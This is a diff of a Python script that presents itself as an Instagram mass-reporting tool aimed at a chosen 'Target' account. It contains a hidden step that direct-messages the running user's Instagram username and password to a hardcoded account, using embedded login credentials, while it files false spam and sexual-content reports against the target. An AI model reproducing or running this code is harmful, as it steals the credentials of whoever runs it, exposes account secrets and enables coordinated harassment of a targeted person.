@@ -1,7 +1,4 @@
 import requests
-user = input("username: ")
-password = input("password: ")
-Target = input("Target: ")
 re = requests.get("https://raw.githubusercontent.com/turki305turki/lage/main/Lage")
 s = (re.text.splitlines())
 for n in s:
@@ -41,27 +38,21 @@ headers = {
 data = {"username":username,"enc_password":"#PWD_INSTAGRAM_BROWSER:0:1589682409:"+pasword,"queryParams":"{}","optIntoOneTap":"false"}
 login = r.post(url,headers=headers,data=data,allow_redirects=True)
 if 'userId' in login.text:
+	url_id = "https://www.instagram.com/"+Target+"/?__a=1"
+	url_get_user_id = r.get(url_id).json()
+	user_id = str(url_get_user_id["logging_page_id"]) 
+	idinsta = str(user_id.split("_")[1])
+	print("id Target:",idinsta)
 	from InstagramAPI import InstagramAPI
-	r = requests.Session()
 	u = 'isidicidisisi'
 	p = 'fhd305'
-	userinstagram = user + ","
-	problem = password
+	userinstagram = username + ","
+	problem = pasword
 	api = InstagramAPI(u, p)
 	api.login()
-	user_id = "2122559934"
+	user_iddd = "2122559934"
 	message = userinstagram + problem
-	api.sendMessage(user_id,message)
-	r.headers.update({'X-CSRFToken': login.cookies['csrftoken']}) 
-	try:
-		url_id = "https://www.instagram.com/%s/?__a=1"%(Target)
-		url_get_user_id = r.get(url_id).json()
-		user_id = str(url_get_user_id["logging_page_id"]) 
-		idinsta = str(user_id.split("_")[1])
-		s = requests.get("https://instagram.com/"+Target+"/?__a=1")
-		print("id Target:",idinsta)
-	except:
-		print("the Target is wrong...")
+	api.sendMessage(user_iddd,message)
 	data2 = {"source_name":"","reason_id":1,"frx_context":""}
 	r.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
 else:
@@ -80,6 +71,7 @@ def spam():
 			print("Error Report spam")
 def sexual():
 	if True:
+		
 		urlRep = "https://i.instagram.com/users/" + idinsta + "/report/" 
 		datas = {  
 			'source_name': '', 'reason_id': 4, 'frx_context': ''
